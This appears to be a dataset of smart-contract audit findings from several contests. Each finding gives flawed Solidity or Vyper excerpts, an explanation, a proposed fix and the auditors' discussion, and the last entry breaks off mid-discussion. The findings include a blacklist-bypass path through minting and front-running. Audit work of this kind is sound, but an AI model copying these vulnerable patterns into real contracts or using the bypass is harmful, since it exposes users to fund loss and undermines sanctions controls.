FixedStrikeOptionTeller: create can be invoked when block.timestamp == expiry but exercise revertsчmediumч```\n        if (uint256(expiry) < block.timestamp) revert Teller_OptionExpired(expiry);\n```\nчIn `FixedStrikeOptionTeller` contract, new option tokens can be minted when `block.timestamp == expiry` but these option tokens cannot be exercised even in the same transaction.\nThe `create` function has this statement:\n```\n        if (uint256(expiry) < block.timestamp) revert Teller_OptionExpired(expiry);\n```\n\nThe `exercise` function has this statement:\n```\n        if (uint48(block.timestamp) >= expiry) revert Teller_OptionExpired(expiry);\n```\n\nNotice the `>=` operator which means when `block.timestamp == expiry` the `exercise` function reverts.\nThe `FixedStrikeOptionTeller.create` function is invoked whenever a user claims his staking rewards using `OTLM.claimRewards` or `OTLM.claimNextEpochRewards`. (here)\nSo if a user claims his rewards when `block.timestamp == expiry` he receives the freshly minted option tokens but he cannot exercise these option tokens even in the same transaction (or same block).\nMoreover, since the receiver do not possess these freshly minted option tokens, he cannot `reclaim` them either (assuming `reclaim` function contains the currently missing `optionToken.burn` statement).чConsider maintaining a consistent timestamp behaviour. Either prevent creation of option tokens at expiry or allow them to be exercised at expiry.\nDiscussion\nOighty\nAgree with the proposed solution. Will change the timestamp checks to be consistent.\nOighty\nFix implemented at https://github.com/Bond-Protocol/options/pull/6\nctf-sec\nFix looks great!чOption token will be minted to user but he cannot exercise them. Receiver cannot reclaim them as he doesn't hold that token amount.\nThis leads to loss of funds as the minted option tokens become useless. Also the scenario of users claiming at expiry is not rare.\nCode Snippet\nTool used\nManual Review
stake() missing set lastEpochClaimed when userBalance equal 0чmediumч```\n    function stake(\n        uint256 amount_,\n        bytes calldata proof_\n    ) external nonReentrant requireInitialized updateRewards tryNewEpoch {\n// rest of code\n        uint256 userBalance = stakeBalance[msg.sender];\n        if (userBalance > 0) {\n            // Claim outstanding rewards, this will update the rewards per token claimed\n            _claimRewards();\n        } else {\n            // Initialize the rewards per token claimed for the user to the stored rewards per token\n          rewardsPerTokenClaimed[msg.sender] = rewardsPerTokenStored;\n        }\n\n        // Increase the user's stake balance and the total balance\n        stakeBalance[msg.sender] = userBalance + amount_;\n        totalBalance += amount_;\n\n        // Transfer the staked tokens from the user to this contract\n        stakedToken.safeTransferFrom(msg.sender, address(this), amount_);\n    }\n```\nчbecause `stake()` don't set lastEpochClaimed[user] = `last epoch` if `userBalance` equal 0 So all new stake user must loop from 0 to `last epoch` for `_claimRewards()` As the epoch gets bigger and bigger it will waste a lot of GAS, which may eventually lead to `GAS_OUT`\nin `stake()`, when the first-time `stake()` only `rewardsPerTokenClaimed[msg.sender]` but don't set `lastEpochClaimed[msg.sender]`\n```\n    function stake(\n        uint256 amount_,\n        bytes calldata proof_\n    ) external nonReentrant requireInitialized updateRewards tryNewEpoch {\n// rest of code\n        uint256 userBalance = stakeBalance[msg.sender];\n        if (userBalance > 0) {\n            // Claim outstanding rewards, this will update the rewards per token claimed\n            _claimRewards();\n        } else {\n            // Initialize the rewards per token claimed for the user to the stored rewards per token\n          rewardsPerTokenClaimed[msg.sender] = rewardsPerTokenStored;\n        }\n\n        // Increase the user's stake balance and the total balance\n        stakeBalance[msg.sender] = userBalance + amount_;\n        totalBalance += amount_;\n\n        // Transfer the staked tokens from the user to this contract\n        stakedToken.safeTransferFrom(msg.sender, address(this), amount_);\n    }\n```\n\nso every new staker , needs claims from 0\n```\n    function _claimRewards() internal returns (uint256) {\n        // Claims all outstanding rewards for the user across epochs\n        // If there are unclaimed rewards from epochs where the option token has expired, the rewards are lost\n\n        // Get the last epoch claimed by the user\n      uint48 userLastEpoch = lastEpochClaimed[msg.sender];\n\n        // If the last epoch claimed is equal to the current epoch, then only try to claim for the current epoch\n        if (userLastEpoch == epoch) return _claimEpochRewards(epoch);\n\n        // If not, then the user has not claimed all rewards\n        // Start at the last claimed epoch because they may not have completely claimed that epoch\n        uint256 totalRewardsClaimed;\n     for (uint48 i = userLastEpoch; i <= epoch; i++) {\n            // For each epoch that the user has not claimed rewards for, claim the rewards\n            totalRewardsClaimed += _claimEpochRewards(i);\n        }\n\n        return totalRewardsClaimed;\n    }\n```\n\nWith each new addition of `epoch`, the new stake must consumes a lot of useless loops, from loop 0 to `last epoch` When `epoch` reaches a large size, it will result in GAS_OUT and the method cannot be executedч```\n    function stake(\n        uint256 amount_,\n        bytes calldata proof_\n    ) external nonReentrant requireInitialized updateRewards tryNewEpoch {\n// rest of code\n        if (userBalance > 0) {\n            // Claim outstanding rewards, this will update the rewards per token claimed\n            _claimRewards();\n        } else {\n            // Initialize the rewards per token claimed for the user to the stored rewards per token\n            rewardsPerTokenClaimed[msg.sender] = rewardsPerTokenStored;\n+           lastEpochClaimed[msg.sender] = epoch;\n        }\n```\n\nDiscussion\nOighty\nAgree with the proposed solution.\nctf-sec\nGreat finding, agree with medium severity\nOighty\nFix implemented at https://github.com/Bond-Protocol/options/pull/5\nctf-sec\nWill look into this, seems all the duplicate suggest the fix:\n```\n lastEpochClaimed[msg.sender] = epoch;\n```\n\nbut the implemented fix is\n```\n lastEpochClaimed[msg.sender] = epoch -1\n```\n\nmaybe testing can help as well, just want to make sure there is no off-by-one issue o(╥﹏╥)o\nOighty\nWill look into this, seems all the duplicate suggest the fix:\n` lastEpochClaimed[msg.sender] = epoch;`\nbut the implemented fix is\n` lastEpochClaimed[msg.sender] = epoch -1`\nmaybe testing can help as well, just want to make sure there is no off-by-one issue o(╥﹏╥)o\nThe reason to set lastEpochClaimed to `epoch - 1` is that you want the user state to appear like they have claimed everything before the epoch they started staking on. They haven't claimed any tokens for the current epoch yet, so that would be inaccurate.\nOighty\n@ctf-sec did you have a chance to review this more?\nctf-sec\nYes, fix looks goodчWhen the `epoch` gradually increases, the new take will waste a lot of GAS When it is very large, it will cause GAS_OUT\nCode Snippet\nTool used\nManual Review
claimRewards() If a rewards is too small, it may block other epochsчmediumч```\n    function _claimEpochRewards(uint48 epoch_) internal returns (uint256) {\n// rest of code\n      uint256 rewards = ((rewardsPerTokenEnd - userRewardsClaimed) * stakeBalance[msg.sender]) /\n            10 ** stakedTokenDecimals;\n        // Mint the option token on the teller\n        // This transfers the reward amount of payout tokens to the option teller in exchange for the amount of option tokens\n        payoutToken.approve(address(optionTeller), rewards);\n        optionTeller.create(optionToken, rewards);\n```\nчWhen `claimRewards()`, if some `rewards` is too small after being round down to 0 If `payoutToken` does not support transferring 0, it will block the subsequent epochs\nThe current formula for calculating rewards per cycle is as follows.\n```\n    function _claimEpochRewards(uint48 epoch_) internal returns (uint256) {\n// rest of code\n      uint256 rewards = ((rewardsPerTokenEnd - userRewardsClaimed) * stakeBalance[msg.sender]) /\n            10 ** stakedTokenDecimals;\n        // Mint the option token on the teller\n        // This transfers the reward amount of payout tokens to the option teller in exchange for the amount of option tokens\n        payoutToken.approve(address(optionTeller), rewards);\n        optionTeller.create(optionToken, rewards);\n```\n\nCalculate `rewards` formula : `uint256 `rewards` = ((rewardsPerTokenEnd - userRewardsClaimed) * stakeBalance[msg.sender]) /10 ** stakedTokenDecimals;`\nWhen `rewardsPerTokenEnd` is very close to `userRewardsClaimed`, `rewards` is likely to be round downs to 0 Some tokens do not support transfer(amount=0) This will revert and lead to can't claimsч```\n    function _claimEpochRewards(uint48 epoch_) internal returns (uint256) {\n// rest of code..\n\n        uint256 rewards = ((rewardsPerTokenEnd - userRewardsClaimed) * stakeBalance[msg.sender]) /\n            10 ** stakedTokenDecimals;\n+      if (rewards == 0 ) return 0;\n        // Mint the option token on the teller\n        // This transfers the reward amount of payout tokens to the option teller in exchange for the amount of option tokens\n        payoutToken.approve(address(optionTeller), rewards);\n        optionTeller.create(optionToken, rewards);\n```\n\nDiscussion\nOighty\nAgree with the proposed solution.\nctf-sec\nAgree, while the revert in 0 transfer is an edge case, this does block reward distribution and new epoch from starting\nOighty\nFix implemented at https://github.com/Bond-Protocol/options/pull/4\nctf-sec\nHi Oighty, just one more than to highlight\n```\n   /// @notice Modifier that tries to start a new epoch before a function is executed and rewards the caller for doing so\n    modifier tryNewEpoch() {\n        // If the epoch has ended, try to start a new one\n        if (uint48(block.timestamp) >= epochStart + epochDuration) {\n            _startNewEpoch();\n            // Issue reward to caller for starting the new epoch\n            payoutToken.approve(address(optionTeller), epochTransitionReward);\n            FixedStrikeOptionToken optionToken = epochOptionTokens[epoch];\n            optionTeller.create(optionToken, epochTransitionReward);\n            ERC20(address(optionToken)).safeTransfer(msg.sender, epochTransitionReward);\n        }\n        _;\n    }\n```\n\nif the owner set the epochTransitionReward to zero and the underlying payout token revert in zero amount transfer,\nnew epoch starting is blocked, the owner is not able to adjust epochTransitionReward in the current codebase\nemm we can modify the code to\n```\n  if (uint48(block.timestamp) >= epochStart + epochDuration) {\n            _startNewEpoch();\n            // Issue reward to caller for starting the new epoch\n           if(epochTransitionReward > 0) {\n                  payoutToken.approve(address(optionTeller), epochTransitionReward);\n                  FixedStrikeOptionToken optionToken = epochOptionTokens[epoch];\n                  optionTeller.create(optionToken, epochTransitionReward);\n                  ERC20(address(optionToken)).safeTransfer(msg.sender, epochTransitionReward);\n            }\n        }\n```\n\nthat would resolve the issue\nalso in the constructor of OTLM, can validate the epochTransitionReward to make sure it is not 0\nor add a seperate admin function so the owner can update the epochTransitionReward parameter.\nctf-sec\nOther than the comments, fix looks good\nOighty\n@ctf-sec I added the zero check for the epoch transition reward and also added a setter function so the owner can change it.\nctf-sec\nThanks Oighty, then all good!чStuck `claimRewards()` when the rewards of an epoch is 0\nCode Snippet\nTool used\nManual Review
Owner unable to collect fulfillment fee from certain users due to revert errorчmediumч```\nowed = (totalTokenOut * depositAmount) / totalTokenDeposited\nowed = (9 USDC * 10 SHIB) / 100000000 SHIB\nowed = (9 * 10^6 * 10 * 10^18) / (100000000 * 10^18)\nowed = (9 * 10^6 * 10) / (100000000)\nowed = 90000000 / 100000000\nowed = 0 USDC (Round down)\n```\nчCertain users might not be able to call the `claimOrder` function under certain conditions, resulting in the owner being unable to collect fulfillment fees from the users.\nAssume the following:\nSHIB has 18 decimals of precision, while USDC has 6.\nAlice (Small Trader) deposited 10 SHIB while Bob (Big Whale) deposited 100000000 SHIB.\nThe batch order was fulfilled, and it claimed 9 USDC (totalTokenOut)\nThe following formula and code compute the number of swapped/claimed USDC tokens a user is entitled to.\n```\nowed = (totalTokenOut * depositAmount) / totalTokenDeposited\nowed = (9 USDC * 10 SHIB) / 100000000 SHIB\nowed = (9 * 10^6 * 10 * 10^18) / (100000000 * 10^18)\nowed = (9 * 10^6 * 10) / (100000000)\nowed = 90000000 / 100000000\nowed = 0 USDC (Round down)\n```\n\nBased on the above assumptions and computation, Alice will receive zero tokens in return due to a rounding error in Solidity.\nThe issue will be aggravated under the following conditions:\nIf the difference in the precision between `token0` and `token1` in the pool is larger\nThe token is a stablecoin, which will attract a lot of liquidity within a small price range (e.g. $0.95 ~ $1.05)\nNote: Some tokens have a low decimal of 2 (e.g., Gemini USD), while others have a high decimal of 24 (e.g., `YAM-V2` has 24). Refer to https://github.com/d-xo/weird-erc20#low-decimals\nThe rounding down to zero is unavoidable in this scenario due to how values are represented. It is not possible to send Alice 0.9 WEI of USDC. The smallest possible amount is 1 WEI.\nIn this case, it will attempt to transfer a zero amount of `tokenOut,` which might result in a revert as some tokens disallow the transfer of zero value. As a result, when users call the `claimOrder` function, it will revert, and the owner will not be able to collect the fulfillment fee from the users.\n```\n        // Transfer tokens owed to user.\n        tokenOut.safeTransfer(user, owed);\n```\nч
Bypass the blacklist restriction because the blacklist check is not done when minting or burningчhighч```\n   function _beforeTokenTransfer(address from, address to, uint256) internal virtual override {\n        // Restrictions ignored for minting and burning\n        // If transferRestrictor is not set, no restrictions are applied\n\n        // @audit\n        // why don't you not apply mint and burn in blacklist?\n        if (from == address(0) || to == address(0) || address(transferRestrictor) == address(0)) {\n            return;\n        }\n\n        // Check transfer restrictions\n        transferRestrictor.requireNotRestricted(from, to);\n    }\n```\nчBypass the blacklist restriction because the blacklist check is not done when minting or burning\nIn the whitepaper:\nthe protocol emphasis that they implement a blacklist feature for enforcing OFAC, AML and other account security requirements A blacklisted will not able to send or receive tokens\nthe protocol want to use the whitelist feature to be compliant to not let the blacklisted address send or receive dSahres\nFor this reason, before token transfer, the protocol check if address from or address to is blacklisted and the blacklisted address can still create buy order or sell order\n```\n   function _beforeTokenTransfer(address from, address to, uint256) internal virtual override {\n        // Restrictions ignored for minting and burning\n        // If transferRestrictor is not set, no restrictions are applied\n\n        // @audit\n        // why don't you not apply mint and burn in blacklist?\n        if (from == address(0) || to == address(0) || address(transferRestrictor) == address(0)) {\n            return;\n        }\n\n        // Check transfer restrictions\n        transferRestrictor.requireNotRestricted(from, to);\n    }\n```\n\nthis is calling\n```\nfunction requireNotRestricted(address from, address to) external view virtual {\n // Check if either account is restricted\n if (blacklist[from] || blacklist[to]) {\n  revert AccountRestricted();\n }\n // Otherwise, do nothing\n}\n```\n\nbut as we can see, when the dShare token is burned or minted, the blacklist does not apply to address(to)\nthis allows the blacklisted receiver to bypass the blacklist restriction and still send and receive dShares and cash out their dShares\nbecause the minting dShares is not blacklisted\na blacklisted user create a buy order with payment token and set the order receiver to a non-blacklisted address\nthen later when the buy order is filled, the new dShares is transferred and minted to an not-blacklisted address\nbecause the burning dShares is not blacklisted\nbefore the user is blacklisted, a user can frontrun the blacklist transaction to create a sell order and transfer the dShares into the OrderProcessor\nthen later when the sell order is filled, the dShares in burnt from the SellOrderProcess escrow are burnt and the user can receive the payment tokenч
Escrow record not cleared on cancellation and order fillчmediumч```\n        bytes32 orderId = getOrderIdFromOrderRequest(orderRequest, salt);\n        uint256 escrow = getOrderEscrow[orderId];\n        if (amount > escrow) revert AmountTooLarge();\n\n\n        // Update escrow tracking\n        getOrderEscrow[orderId] = escrow - amount;\n        // Notify escrow taken\n        emit EscrowTaken(orderId, orderRequest.recipient, amount);\n\n\n        // Take escrowed payment\n        IERC20(orderRequest.paymentToken).safeTransfer(msg.sender, amount);\n```\nчThe escrow record will exists as a positive amount which can lead to accounting issues.\nTake the following example:\nOperator broadcasts a `takeEscrow()` transaction around the same time that the user calls `requestCancel()` for the order\nOperator also broadcasts a `cancelOrder()` transaction\nIf the `cancelOrder()` transaction is mined before the `takeEscrow()` transaction, then the contract will transfer out token when it should not be able to.\n`takeEscrow()` simply checks that the `getOrderEscrow[orderId]` is less than or equal to the requested amount:\n```\n        bytes32 orderId = getOrderIdFromOrderRequest(orderRequest, salt);\n        uint256 escrow = getOrderEscrow[orderId];\n        if (amount > escrow) revert AmountTooLarge();\n\n\n        // Update escrow tracking\n        getOrderEscrow[orderId] = escrow - amount;\n        // Notify escrow taken\n        emit EscrowTaken(orderId, orderRequest.recipient, amount);\n\n\n        // Take escrowed payment\n        IERC20(orderRequest.paymentToken).safeTransfer(msg.sender, amount);\n```\n\nCancelling the order does not clear the `getOrderEscrow` record:\n```\n    function _cancelOrderAccounting(OrderRequest calldata order, bytes32 orderId, OrderState memory orderState)\n        internal\n        virtual\n        override\n    {\n        // Prohibit cancel if escrowed payment has been taken and not returned or filled\n        uint256 escrow = getOrderEscrow[orderId];\n        if (orderState.remainingOrder != escrow) revert UnreturnedEscrow();\n\n\n        // Standard buy order accounting\n        super._cancelOrderAccounting(order, orderId, orderState);\n    }\n}\n```\n\nThis can lead to an good-faith and trusted operator accidentally taking funds from the contract that should not be able to leave.\ncoming up with the fact that the transaction does not have deadline or expiration date:\nconsider the case below:\na good-faith operator send a transaction, takeEscrow\nthe transaction is pending in the mempool for a long long long time\nthen user fire a cancel order request\nthe operator help user cancel the order\nthe operator send a transcation cancel order\ncancel order transaction land first\nthe takeEscrow transaction lands\nbecause escrow state is not clear up, the fund (other user's fund) is taken\nIt's also worth noting that the operator would not be able to call `returnEscrow()` because the order state has already been cleared by the cancellation. `getRemainingOrder()` would return 0.\n```\n    function returnEscrow(OrderRequest calldata orderRequest, bytes32 salt, uint256 amount)\n        external\n        onlyRole(OPERATOR_ROLE)\n    {\n        // No nonsense\n        if (amount == 0) revert ZeroValue();\n        // Can only return unused amount\n        bytes32 orderId = getOrderIdFromOrderRequest(orderRequest, salt);\n        uint256 remainingOrder = getRemainingOrder(orderId);\n        uint256 escrow = getOrderEscrow[orderId];\n        // Unused amount = remaining order - remaining escrow\n        if (escrow + amount > remainingOrder) revert AmountTooLarge();\n```\nчClear the escrow record upon canceling the order.\nDiscussion\njaketimothy\nFixed in\nhttps://github.com/dinaricrypto/sbt-contracts/pull/122\nctf-sec\nThe fix reset the escrow balance after cancelling\nthe protocol may want to consider handling the escrow accounting properly when the order is filled as well (such as reset the escrow balance to 0)ч
Cancellation refunds should return tokens to order creator, not recipientчmediumч```\n    function _cancelOrderAccounting(OrderRequest calldata orderRequest, bytes32 orderId, OrderState memory orderState)\n        internal\n        virtual\n        override\n    {\n        // rest of code\n\n        uint256 refund = orderState.remainingOrder + feeState.remainingPercentageFees;\n\n        // rest of code\n\n        if (refund + feeState.feesEarned == orderRequest.quantityIn) {\n            _closeOrder(orderId, orderRequest.paymentToken, 0);\n            // Refund full payment\n            refund = orderRequest.quantityIn;\n        } else {\n            // Otherwise close order and transfer fees\n            _closeOrder(orderId, orderRequest.paymentToken, feeState.feesEarned);\n        }\n\n\n        // Return escrow\n        IERC20(orderRequest.paymentToken).safeTransfer(orderRequest.recipient, refund);\n    }\n```\nчWhen an order is cancelled, the refund is sent to `order.recipient` instead of the order creator because it is the order creator (requestor) pay the payment token for buy order or pay the dShares for sell order\nAs is the standard in many L1/L2 bridges, cancelled deposits should be returned to the order creator instead of the recipient. In Dinari's current implementation, a refund acts as a transfer with a middle-man.\nSimply, the `_cancelOrderAccounting()` function returns the refund to the order.recipient:\n```\n    function _cancelOrderAccounting(OrderRequest calldata orderRequest, bytes32 orderId, OrderState memory orderState)\n        internal\n        virtual\n        override\n    {\n        // rest of code\n\n        uint256 refund = orderState.remainingOrder + feeState.remainingPercentageFees;\n\n        // rest of code\n\n        if (refund + feeState.feesEarned == orderRequest.quantityIn) {\n            _closeOrder(orderId, orderRequest.paymentToken, 0);\n            // Refund full payment\n            refund = orderRequest.quantityIn;\n        } else {\n            // Otherwise close order and transfer fees\n            _closeOrder(orderId, orderRequest.paymentToken, feeState.feesEarned);\n        }\n\n\n        // Return escrow\n        IERC20(orderRequest.paymentToken).safeTransfer(orderRequest.recipient, refund);\n    }\n```\n\nRefunds should be returned to the order creator in cases where the input recipient was an incorrect address or simply the user changed their mind prior to the order being filled.чReturn the funds to the order creator, not the recipient.\nDiscussion\nbizzyvinci\nEscalate\nThis issue ought to be high because it doesn't require external conditions or specific states for users to lose a significant amount. It is very likely that `msg.sender != recipient` cause msg.sender and recipient could be different entities trying to have a deal either EOA-EOA or contract-EOA or contract-contract. Canceling order is meant to be a perfect unwind as mentioned by the sponsor.\nThis issue affects every single cancelled order, both buy, direct buy and sell orders.\n\nsherlock-admin\nEscalate\nThis issue ought to be high because it doesn't require external conditions or specific states for users to lose a significant amount. It is very likely that `msg.sender != recipient` cause msg.sender and recipient could be different entities trying to have a deal either EOA-EOA or contract-EOA or contract-contract. Canceling order is meant to be a perfect unwind as mentioned by the sponsor.\nThis issue affects every single cancelled order, both buy, direct buy and sell orders.\nThe escalation could not be created because you are not exceeding the escalation threshold.\nYou can view the required number of additional valid issues/judging contest payouts in your Profile page, in the Sherlock webapp.\njaketimothy\nFixed in\nhttps://github.com/dinaricrypto/sbt-contracts/pull/117\nctf-sec\nFix looks goodчPotential for irreversible loss of funds\nInability to truly cancel order\nCode Snippet\nTool used\nManual Review
`reduce_position` doesn’t update margin mapping correctlyчhighч```\ndebt_amount: uint256 = self._debt(_position_uid)\n    margin_debt_ratio: uint256 = position.margin_amount * PRECISION / debt_amount\n\n\n    amount_out_received: uint256 = self._swap(\n        position.position_token, position.debt_token, _reduce_by_amount, min_amount_out\n    )\n\n\n    # reduce margin and debt, keep leverage as before\n    reduce_margin_by_amount: uint256 = (\n        amount_out_received * margin_debt_ratio / PRECISION\n    )\n    reduce_debt_by_amount: uint256 = amount_out_received - reduce_margin_by_amount\n\n\n    position.margin_amount -= reduce_margin_by_amount\n\n\n    burnt_debt_shares: uint256 = self._repay(position.debt_token, reduce_debt_by_amount)\n    position.debt_shares -= burnt_debt_shares\n    position.position_amount -= _reduce_by_amount\n```\nч`reduce_position` function decrease the margin amount of the position but doesn't add it back to the user's margin mapping, making it impossible to withdraw the margin.\nAfter selling some position tokens back against debt tokens using `reduce_position` function, `debt_shares` and `margin_amount` are reduced proportionally to keep leverage the same as before:\nVault.vy#L313-L330\n```\ndebt_amount: uint256 = self._debt(_position_uid)\n    margin_debt_ratio: uint256 = position.margin_amount * PRECISION / debt_amount\n\n\n    amount_out_received: uint256 = self._swap(\n        position.position_token, position.debt_token, _reduce_by_amount, min_amount_out\n    )\n\n\n    # reduce margin and debt, keep leverage as before\n    reduce_margin_by_amount: uint256 = (\n        amount_out_received * margin_debt_ratio / PRECISION\n    )\n    reduce_debt_by_amount: uint256 = amount_out_received - reduce_margin_by_amount\n\n\n    position.margin_amount -= reduce_margin_by_amount\n\n\n    burnt_debt_shares: uint256 = self._repay(position.debt_token, reduce_debt_by_amount)\n    position.debt_shares -= burnt_debt_shares\n    position.position_amount -= _reduce_by_amount\n```\n\nHowever, even though some of the margin have been paid back (position.margin_amount has been reduced), `self.margin[position.account][position.debt_token]` mapping hasn't been updated by adding `reduce_margin_by_amount` which would allow the user to withdraw his margin.чConsider modifying the code like this:\n```\n    reduce_debt_by_amount: uint256 = amount_out_received - reduce_margin_by_amount\n\n\n    position.margin_amount -= reduce_margin_by_amount\n+   self.margin[position.account][position.debt_token] += reduce_margin_by_amount\n\n    burnt_debt_shares: uint256 = self._repay(position.debt_token, reduce_debt_by_amount)\n    position.debt_shares -= burnt_debt_shares\n    position.position_amount -= _reduce_by_amount\n```\n\nDiscussion\nUnstoppable-DeFi\nhttps://github.com/Unstoppable-DeFi/unstoppable-dex-audit/pull/6чUsers will lose their margin tokens.\nCode Snippet\nVault.vy#L313-L330\nTool used\nManual Review
Leverage calculation is wrongчhighч```\ndef _calculate_leverage(\n    _position_value: uint256, _debt_value: uint256, _margin_value: uint256\n) -> uint256:\n    if _position_value <= _debt_value:\n        # bad debt\n        return max_value(uint256)\n\n\n    return (\n        PRECISION\n        * (_debt_value + _margin_value)\n        / (_position_value - _debt_value)\n        / PRECISION\n    )\n```\nчLeverage calculation is wrong which will lead to unfair liquidations or over leveraged positions depending on price movements.\n`_calculate_leverage` miscalculate the leverage by using `_debt_value + _margin_value` as numerator instead of `_position_value` :\nVault.vy#L465-L477\n```\ndef _calculate_leverage(\n    _position_value: uint256, _debt_value: uint256, _margin_value: uint256\n) -> uint256:\n    if _position_value <= _debt_value:\n        # bad debt\n        return max_value(uint256)\n\n\n    return (\n        PRECISION\n        * (_debt_value + _margin_value)\n        / (_position_value - _debt_value)\n        / PRECISION\n    )\n```\n\nThe three inputs of the function `_position_value`, `_debt_value` and `_margin_value` are all determined by a chainlink oracle price feed. `_debt_value` represents the value of the position's debt share converted to debt amount in USD. `_margin_value` represents the current value of the position's initial margin amount in USD. `_position_value` represents the current value of the position's initial position amount in USD.\nThe problem with the above calculation is that `_debt_value + _margin_value` does not represent the value of the position. The leverage is the ratio between the current value of the position and the current margin value. `_position_value - _debt_value` is correct and is the current margin value, but `_debt_value + _margin_value` doesn't represent the current value of the position since there is no guarantee that the debt token and the position token have correlated price movements.\nExample: debt token: ETH, position token: BTC.\nAlice uses 1 ETH of margin to borrow 14 ETH (2k USD/ETH) and get 1 BTC (30k USD/BTC) of position token. Leverage is 14.\nThe next day, the price of ETH in USD is still 2k USD/ETH but BTC price in USD went down from 30k to 29k USD/BTC. Leverage is now (_position_value == 29k) / (_position_value == 29k - _debt_value == 28k) = 29, instead of what is calculated in the contract: (_debt_value == 28k + _margin_value == 2k) / (_position_value == 29k - _debt_value == 28k) = 30.ч"Consider modifying the code like this:\n```\ndef _calculate_leverage(\n    _position_value: uint256, _debt_value: uint256, _margin_value: uint256\n) -> uint256:\n    if _position_value <= _debt_value:\n        # bad debt\n        return max_value(uint256)\n\n\n    return (\n        PRECISION\n-       * (_debt_value + _margin_value)\n+       * (_position_value)\n        / (_position_value - _debt_value)\n        / PRECISION\n    )\n```\n\nDiscussion\nUnstoppable-DeFi\nWhile our implementation uses a slightly different definition of leverage and the initial margin + debt as base, we agree that the above implementation is cleaner and more intuitive for users. Both formulas would work similarly though and liquidate positions timely to protect the protocol.\n141345\nagree, maybe medium is more appropriate\n141345\nThe dup https://github.com/sherlock-audit/2023-06-unstoppable-judging/issues/100 gives an example why the current formula could lead to unexpected result.\ntwicek\nEscalate for 10 USDC. My report shows why the current used formula is wrong as it does not take into account that debt tokens and position tokens are not necessarily tokens with correlated prices. The duplicate #100 shows in another way that the formula fail to calculate the leverage of a position correctly. The impact is the same, but my report highlight `_debt_value + _margin_value != _position_value`, the same way that the debt against a house is not equal to the market value of this house (also described in another way in #156). The definition of leverage used in the code is not correct and will lead to unfair liquidations or over leveraged positions, which is definitely high severity.\nsherlock-admin2\nEscalate for 10 USDC. My report shows why the current used formula is wrong as it does not take into account that debt tokens and position tokens are not necessarily tokens with correlated prices. The duplicate #100 shows in another way that the formula fail to calculate the leverage of a position correctly. The impact is the same, but my report highlight `_debt_value + _margin_value != _position_value`, the same way that the debt against a house is not equal to the market value of this house (also described in another way in #156). The definition of leverage used in the code is not correct and will lead to unfair liquidations or over leveraged positions, which is definitely high severity.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nfatherGoose1\nThe duplicate report #100 shows how adding margin makes a position less healthy, and removing margin makes a position healthier. This is simply a backwards implementation that will lead to unfair liquidations or higher leverage than should be possible. The impact is clear loss of funds.\n141345\nEscalate for 10 USDC. My report shows why the current used formula is wrong as it does not take into account that debt tokens and position tokens are not necessarily tokens with correlated prices. The duplicate #100 shows in another way that the formula fail to calculate the leverage of a position correctly. The impact is the same, but my report highlight `_debt_value + _margin_value != _position_value`, the same way that the debt against a house is not equal to the market value of this house (also described in another way in #156). The definition of leverage used in the code is not correct and will lead to unfair liquidations or over leveraged positions, which is definitely high severity.\nUnexpected and unfair liquidation could cause loss to users. Since the issue roots from the formula, the loss could be long term, result in accumulated fund loss for users, can can be deemed as ""material loss of funds"".\nBased on the above, high severity might be appropriate.\nUnstoppable-DeFi\nhttps://github.com/Unstoppable-DeFi/unstoppable-dex-audit/pull/14\nhrishibhat\n@Unstoppable-DeFi based on the above escalation it seems to be a high issue. Is there any other reason this should not be a high-severity issue?\nhrishibhat\nResult: High Has duplicates Considering this issue a valid high\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\ntwicek: accepted"чLeverage calculation is wrong which will lead to unfair liquidations or over leveraged positions depending on price movements.\nCode Snippet\nVault.vy#L465-L477\nTool used\nManual Review
Interested calculated is ampliefied by multiple of 1000 in `_debt_interest_since_last_update`чhighч```\ndef _debt_interest_since_last_update(_debt_token: address) -> uint256:\n\n    return (\n\n        (block.timestamp - self.last_debt_update[_debt_token])* self._current_interest_per_second(_debt_token)\n        * self.total_debt_amount[_debt_token]\n        / PERCENTAGE_BASE \n        / PRECISION\n    )\n```\nчInterest calculated in the `_debt_interest_since_last_update` function is amplified by multiple of 1000, hence can completely brick the system and debt calculation. Because we divide by PERCENTAGE_BASE instead of PERCENTAGE_BASE_HIGH which has more precision and which is used in utilization calculation.\nFollowing function calculated the interest accured over a certain interval :\n```\ndef _debt_interest_since_last_update(_debt_token: address) -> uint256:\n\n    return (\n\n        (block.timestamp - self.last_debt_update[_debt_token])* self._current_interest_per_second(_debt_token)\n        * self.total_debt_amount[_debt_token]\n        / PERCENTAGE_BASE \n        / PRECISION\n    )\n```\n\nBut the results from the above function are amplified by factor of 1000 due to the reason that the intrest per second as per test file is calculated as following:\n```\n    # accordingly the current interest per year should be 3% so 3_00_000\n    # per second that is (300000*10^18)/(365*24*60*60)\n    expected_interest_per_second = 9512937595129375\n\n    assert (\n        expected_interest_per_second\n        == vault_configured.internal._current_interest_per_second(usdc.address)\n    )\n```\n\nSo yearly interest has the precision of 5 as it is calculated using utilization rate and `PERCENTAGE_BASE_HIGH_PRECISION` is used which has precision of 5 .and per second has the precision of 18, so final value has the precision of 23.\nInterest per second has precision = 23.\nBut if we look at the code:\n```\n        (block.timestamp - self.last_debt_update[_debt_token])* self._current_interest_per_second(_debt_token)\n        * self.total_debt_amount[_debt_token]\n        / PERCENTAGE_BASE \n        / PRECISION\n```\n\nWe divide by PERCENTAGE_BASE that is = 100_00 = precision of => 2 And than by PRECISION = 1e18 => precision of 18. So accumulated precision of 20, where as we should have divided by value precises to 23 to match the nominator.\nWhere is we should have divided by PERCENTAGE_BASE_HIGH instead of PERCENTAGE_BASE\nHence the results are amplified by enormous multiple of thousand.ч"Use PERCENTAGE_BASE_HIGH in division instead of PERCENTAGE_BASE.\nDiscussion\nUnstoppable-DeFi\nhttps://github.com/Unstoppable-DeFi/unstoppable-dex-audit/pull/8\nNabeel-javaid\nEscalate for 10 USDC\nThis should be high as described impact in the given submission and the duplicate too.\nsherlock-admin2\nEscalate for 10 USDC\nThis should be high as described impact in the given submission and the duplicate too.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\ntwicek\nEscalate for 10 USDC The wrong calculation of interest rates will cause a direct loss of funds to users. This should definitely be high severity.\nsherlock-admin2\nEscalate for 10 USDC The wrong calculation of interest rates will cause a direct loss of funds to users. This should definitely be high severity.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 